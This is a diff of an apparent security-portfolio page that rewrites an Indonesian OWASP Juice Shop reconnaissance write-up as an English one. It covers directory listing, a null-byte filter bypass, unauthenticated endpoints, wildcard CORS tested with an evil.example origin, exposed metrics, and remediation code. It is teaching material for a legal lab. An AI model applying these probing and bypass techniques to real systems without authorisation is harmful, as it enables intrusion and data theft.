-<h1 id="9-aturan-deteksi-siem-bocor-low">9. Aturan Deteksi SIEM Bocor  [LOW]</h1>
-<p>Dari <code>/ftp/suspicious_errors.yml</code> (setelah bypass):</p>
-<div class="codehilite"><pre><span></span><code><span class="nt">title</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Suspicious error messages specific to the application</span>
-<span class="nt">description</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Detects error messages that only occur from tampering with or attacking the application</span>
-<span class="nt">author</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Bjoern Kimminich</span>
-<span class="nt">logsource</span><span class="p">:</span>
-<span class="w">    </span><span class="nt">category</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">application</span>
-<span class="w">    </span><span class="nt">product</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">nodejs</span>
-<span class="w">    </span><span class="nt">service</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">errorhandler</span>
-<span class="nt">detection</span><span class="p">:</span>
-<span class="w">    </span><span class="nt">keywords</span><span class="p">:</span>
-<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">'Blocked</span><span class="nv"> </span><span class="s">illegal</span><span class="nv"> </span><span class="s">activity'</span>
-</code></pre></div>
-
-<p>→ <strong>Kebocoran yang ironis:</strong> ini justru berkas konfigurasi deteksi serangan.
-Penyerang jadi tahu persis pesan error mana yang memicu alert, sehingga bisa
-menghindari deteksi.</p>
-<hr />
-<h1 id="pelajaran-dari-pengkulitan-ini">📝 PELAJARAN DARI PENGKULITAN INI</h1>
-<h2 id="yang-paling-berharga">Yang paling berharga</h2>
-<p><strong>1. <code>200 OK</code> ≠ file ada.</strong></p>
-<div class="codehilite"><pre><span></span><code>/.git/config     → 200, tapi isinya HTML SPA  ← FALSE POSITIVE
-/package.json    → 200, tapi HTML
-/Promotions.md   → 200, tapi HTML
-</code></pre></div>
-
-<p>Aplikasi SPA punya catch-all route → SEMUA path balikin 200. Wajib cek
-<code>Content-Type</code> dan isi respons. Kalau tidak, laporan penuh false positive.</p>
-<p><strong>2. Directory listing itu pintu masuk paling gampang.</strong>
-<code>/ftp</code> → 12 file sensitif. Satu request.</p>
-<p><strong>3. 403 itu bukan jalan buntu — itu undangan.</strong>
-Filter ekstensi ketemu → langsung coba 11 teknik bypass. Yang menang:
-double-encoded null byte.</p>
-<p><strong>4. Baca JS bundle — sumber endpoint terbaik.</strong>
-1,2 MB <code>main.js</code> → 27 endpoint REST + 15 API. Tanpa nebak URL.</p>
-<p><strong>5. Endpoint tanpa auth itu temuan, bukan kebetulan.</strong>
-<code>/rest/memories</code>, <code>/api/Feedbacks</code>, <code>/api/Challenges</code> — semua 200 tanpa token.</p>
-<p><strong>6. Dependency disclosure = lead CVE, bukan sekadar info.</strong>
-Versi spesifik + lockfile 1.968 paket = peta kerentanan siap pakai.</p>
-<h2 id="metodologi-yang-dipakai">Metodologi yang dipakai</h2>
-<div class="codehilite"><pre><span></span><code>1. FINGERPRINT     header, versi, teknologi
-2. ENUMERASI       baca JS bundle → dapat peta endpoint
-3. VERIFIKASI      cek content-type, buang false positive
-4. PROBE           cari endpoint 200 tanpa auth
-5. TEMBUS          serang filter/validasi yang ketemu
-6. BUKTIKAN        tunjukin dampak nyata, bukan cuma "ada kerentanan"
-7. DOKUMENTASI     request/response mentah + penjelasan
-</code></pre></div>
-
-<h2 id="yang-tidak-berhasil-jujur">Yang TIDAK berhasil (jujur)</h2>
-<div class="codehilite"><pre><span></span><code>✗ Dekripsi coupons_2013.md.bak
-  → bukan XOR/ADD sederhana. encrypt.pyc (Python 2.7) pakai ord/chr/pow.
-  → butuh analisis bytecode lebih dalam untuk membalik algoritmanya.
-
-✗ File .git, package.json, sitemap.xml di root
-  → semua false positive (catch-all SPA)
-</code></pre></div>
-
-<hr />
-<h1 id="saran-perbaikan">🔧 SARAN PERBAIKAN</h1>
-<table>
-<thead>
-<tr>
-<th>#</th>
-<th>Temuan</th>
-<th>Perbaikan</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td>SQLi</td>
-<td>Query terparameterisasi. Lihat <code>001-juice-shop-sqli.md</code> §5</td>
-</tr>
-<tr>
-<td>2</td>
-<td>Directory listing</td>
-<td>Matikan <code>serve-index</code>, sajikan hanya file yang diminta secara eksplisit</td>
-</tr>
-<tr>
-<td>3</td>
-<td>Bypass null byte</td>
-<td>Normalisasi path <strong>SEKALI</strong> dengan benar, tolak <code>\x00</code> mentah, validasi setelah decode final</td>
-</tr>
-<tr>
-<td>4</td>
-<td>Broken access control</td>
-<td>Wajibkan autentikasi + otorisasi. <code>/api/Feedbacks</code> jangan kirim email mentah</td>
-</tr>
-<tr>
-<td>5</td>
-<td>Bocor challenges</td>
-<td>Pindah endpoint ke balik autentikasi admin</td>
-</tr>
-<tr>
-<td>6</td>
-<td>Dependency</td>
-<td>Naikkan <code>sanitize-html</code>, <code>jsonwebtoken</code>, Node ke versi didukung. Audit lockfile</td>
-</tr>
-<tr>
-<td>7</td>
-<td>Metrics</td>
-<td>Batasi <code>/metrics</code> ke jaringan internal, tambah autentikasi</td>
-</tr>
-<tr>
+<td><code>/api/Feedbacks</code></td>
+<td>Feedback comments <strong>including email addresses</strong></td>
 <td>8</td>
-<td>Header</td>
-<td>Tambah CSP, HSTS. Batasi CORS ke origin spesifik</td>
 </tr>
 <tr>
-<td>9</td>
-<td>SIEM rule</td>
-<td>Jangan simpan konfigurasi deteksi di direktori publik</td>
+<td><code>/api/Challenges</code></td>
+<td>Every challenge name + hint text</td>
+<td>116 (66 KB)</td>
+</tr>
+<tr>
+<td><code>/metrics</code></td>
+<td>Prometheus metrics — internal counters, paths, timings</td>
+<td>379 lines</td>
 </tr>
 </tbody>
 </table>
+<p><code>/api/Feedbacks</code> leaking user email addresses alongside their comments is the
+most serious — that is PII exposure, not just information disclosure.</p>
+<p><code>/api/Challenges</code> returning all 116 challenges with hints is equivalent to
+publishing the answer key: every vulnerability in the application, enumerated.</p>
 <hr />
-<h1 id="lampiran-file-bukti">📁 LAMPIRAN — FILE BUKTI</h1>
-<div class="codehilite"><pre><span></span><code>C:\Users\user\security-lab\writeups\002-juice-shop-full-recon.md   ← dokumen ini
-C:\Users\user\security-lab\writeups\001-juice-shop-sqli.md         ← laporan SQLi detail
-
-Bukti mentah:
-  cache\scratch\loot\       → acquisitions.md, incident-support.kdbx, legal.md, announcement_encrypted.md
-  cache\scratch\loot2\      → coupons_2013.md.bak, encrypt.pyc, package-lock.json.bak,
-                              package.json.bak, suspicious_errors.yml, eastere.gg
-  cache\scratch\fb.json     → respons /api/Feedbacks
-  cache\scratch\mem.json    → respons /rest/memories
-  cache\scratch\ch.json     → respons /api/Challenges (116 tantangan)
-  cache\scratch\main.js     → JS bundle (1,2 MB)
+<h2 id="5-missing-security-headers-medium">5. Missing Security Headers  [MEDIUM]</h2>
+<h3 id="reproduction_3">Reproduction</h3>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sSI<span class="w"> </span>http://localhost:3000/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-iE<span class="w"> </span><span class="s2">"content-security|strict-transport|x-frame|x-content"</span>
 </code></pre></div>
-<div class="crumbs" style="margin-top:52px"><a href="../index.html">← balik ke daftar writeup</a></div>
+
+<h3 id="result">Result</h3>
+<div class="codehilite"><pre><span></span><code>(none of these headers present)
+</code></pre></div>
+
+<table>
+<thead>
+<tr>
+<th>Header</th>
+<th>Status</th>
+<th>Consequence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Content-Security-Policy</code></td>
+<td>missing</td>
+<td>No mitigation layer against XSS</td>
+</tr>
+<tr>
+<td><code>Strict-Transport-Security</code></td>
+<td>missing</td>
+<td>Allows protocol downgrade / stripping</td>
+</tr>
+<tr>
+<td><code>X-Content-Type-Options</code></td>
+<td>missing</td>
+<td>MIME-type sniffing permitted</td>
+</tr>
+<tr>
+<td><code>X-Frame-Options</code></td>
+<td>missing</td>
+<td>Clickjacking possible</td>
+</tr>
+</tbody>
+</table>
+<p>The missing CSP is directly relevant — the DOM XSS documented in write-up 004
+would have been blocked outright by a strict <code>script-src 'self'</code> policy.</p>
+<h3 id="remediation_1">Remediation</h3>
+<div class="codehilite"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">helmet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">'helmet'</span><span class="p">);</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">helmet</span><span class="p">());</span><span class="w">                       </span><span class="c1">// sets all four headers by default</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">helmet</span><span class="p">.</span><span class="nx">contentSecurityPolicy</span><span class="p">({</span>
+<span class="w">  </span><span class="nx">directives</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">defaultSrc</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"'self'"</span><span class="p">],</span>
+<span class="w">    </span><span class="nx">scriptSrc</span><span class="o">:</span><span class="w">  </span><span class="p">[</span><span class="s2">"'self'"</span><span class="p">],</span><span class="w">              </span><span class="c1">// blocks inline XSS execution</span>
+<span class="w">    </span><span class="nx">objectSrc</span><span class="o">:</span><span class="w">  </span><span class="p">[</span><span class="s2">"'none'"</span><span class="p">],</span>
+<span class="w">    </span><span class="nx">frameAncestors</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"'none'"</span><span class="p">],</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="p">}));</span>
+</code></pre></div>
+
+<hr />
+<h2 id="6-wildcard-cors-policy-medium">6. Wildcard CORS Policy  [MEDIUM]</h2>
+<h3 id="reproduction_4">Reproduction</h3>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sSI<span class="w"> </span>http://localhost:3000/<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Origin: https://evil.example"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>access-control
+</code></pre></div>
+
+<h3 id="result_1">Result</h3>
+<div class="codehilite"><pre><span></span><code>Access-Control-Allow-Origin: *
+</code></pre></div>
+
+<p>Any origin can read responses from this API. Combined with cookie-based
+sessions, this enables cross-origin data theft from any malicious page a user
+visits.</p>
+<h3 id="remediation_2">Remediation</h3>
+<div class="codehilite"><pre><span></span><code><span class="c1">// SAFE — allow-list instead of wildcard</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">ALLOWED</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">'https://app.example.com'</span><span class="p">];</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">((</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">origin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">ALLOWED</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">origin</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s1">'Access-Control-Allow-Origin'</span><span class="p">,</span><span class="w"> </span><span class="nx">origin</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s1">'Vary'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Origin'</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="nx">next</span><span class="p">();</span>
+<span class="p">});</span>
+</code></pre></div>
+
+<p>Never combine <code>Access-Control-Allow-Origin: *</code> with
+<code>Access-Control-Allow-Credentials: true</code>.</p>
+<hr />
+<h2 id="7-prometheus-metrics-exposed-unauthenticated-medium">7. Prometheus Metrics Exposed Unauthenticated  [MEDIUM]</h2>
+<h3 id="reproduction_5">Reproduction</h3>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>http://localhost:3000/metrics<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-30
+</code></pre></div>
+
+<h3 id="result_2">Result</h3>
+<p>379 lines of Prometheus metrics, publicly readable: internal route names, HTTP
+status distributions, request timings, process memory. Useful for mapping the
+application's internals without touching the application itself.</p>
+<h3 id="remediation_3">Remediation</h3>
+<div class="codehilite"><pre><span></span><code><span class="c1">// bind metrics to localhost only, or gate behind auth</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/metrics'</span><span class="p">,</span><span class="w"> </span><span class="nx">authenticate</span><span class="p">([</span><span class="s1">'monitoring'</span><span class="p">]),</span><span class="w"> </span><span class="nx">metricsHandler</span><span class="p">);</span>
+</code></pre></div>
+
+<hr />
+<h2 id="8-outdated-dependencies-with-known-cves-low">8. Outdated Dependencies with Known CVEs  [LOW]</h2>
+<p>Source: the leaked <code>package.json.bak</code> (finding 2).</p>
+<div class="codehilite"><pre><span></span><code>Application   : 6.2.0-SNAPSHOT
+sanitize-html : 1.4.2          ← known XSS bypass vectors in this range
+jsonwebtoken  : ~8             ← algorithm-confusion issues in older versions
+Node engine   : &gt;=6 &lt;=9        ← end-of-life; no security patches
+</code></pre></div>
+
+<p>Applications running on end-of-life runtimes accumulate unpatched
+vulnerabilities indefinitely. This is a supply-chain risk, not a single bug.</p>
+<hr />
+<h2 id="9-spa-catch-all-masks-real-404s-low">9. SPA Catch-All Masks Real 404s  [LOW]</h2>
+<p>Every unknown path returns HTTP 200 with the SPA's HTML — including paths that
+should 404.</p>
+<div class="codehilite"><pre><span></span><code><span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span>/.git/config<span class="w"> </span>/package.json<span class="w"> </span>/sitemap.xml<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">"</span><span class="nv">$p</span><span class="s2"> → "</span>
+<span class="w">  </span>curl<span class="w"> </span>-sS<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{content_type}\n"</span><span class="w"> </span><span class="s2">"http://localhost:3000</span><span class="nv">$p</span><span class="s2">"</span>
+<span class="k">done</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>/.git/config   → 200 text/html
+/package.json  → 200 text/html
+/sitemap.xml   → 200 text/html
+</code></pre></div>
+
+<p>All three return the SPA shell. <code>/metrics</code> (text/plain) and <code>/ftp</code> (HTML
+listing) were the only genuinely distinct responses.</p>
+<h3 id="why-this-matters-for-testing">Why this matters for testing</h3>
+<p><strong><code>200 OK</code> does not mean a file exists.</strong> This produced false positives during
+reconnaissance — probing for exposed files requires checking <code>Content-Type</code>,
+not just the status code. A real <code>.git/config</code> would return <code>text/plain</code>; this
+returns <code>text/html</code>.</p>
+<hr />
+<h2 id="methodology">🔧 Methodology</h2>
+<div class="codehilite"><pre><span></span><code>1. Fingerprint   → headers, tech stack, response shapes
+2. Enumerate     → parse JS bundle for endpoints (15 /api/*, 21 /rest/*)
+3. Probe         → unauthenticated access to every discovered endpoint
+4. Verify        → confirm Content-Type before reporting a hit
+5. Exploit       → injection, filter bypass, data extraction
+6. Document      → reproduction steps + root cause + remediation
+</code></pre></div>
+
+<p><strong>Tools:</strong> curl, Python (parsing/verification), manual analysis.
+No Go/Docker-dependent toolchain — everything portable.</p>
+<hr />
+<h2 id="key-lessons">📝 Key Lessons</h2>
+<p><strong>1. Directory listings are the cheapest door in.</strong>
+Before any injection work, check for browsable directories and backup files.
+Highest return per unit of effort.</p>
+<p><strong>2. <code>200 OK</code> is not evidence.</strong>
+The SPA catch-all nearly produced false positives on <code>.git/config</code>,
+<code>package.json</code>, and <code>sitemap.xml</code>. Always check <code>Content-Type</code>.</p>
+<p><strong>3. Filters fail at encoding boundaries.</strong>
+The extension filter blocked eleven ordinary bypass techniques and fell to one
+double-encoded null byte. When validating, normalise once and use exactly that
+value.</p>
+<p><strong>4. Verify the claim, not the assumption.</strong>
+Every finding here was confirmed with a second, independent request. A response
+that <em>looks</em> like success is not success.</p>
+<div class="crumbs" style="margin-top:52px"><a href="../index.html">← back to all write-ups</a></div>
 </div></article>
 <footer class="site"><div class="wrap">
-  <span>Portofolio keamanan — latihan lab legal (OWASP Juice Shop).</span>
-  <span class="mono">dibuat 2026-10-09</span>
+  <span>Security research portfolio — testing performed in authorised training labs.</span>
+  <span class="mono">built 2026-10-09</span>
 </div></footer>
 </body>
 </html>
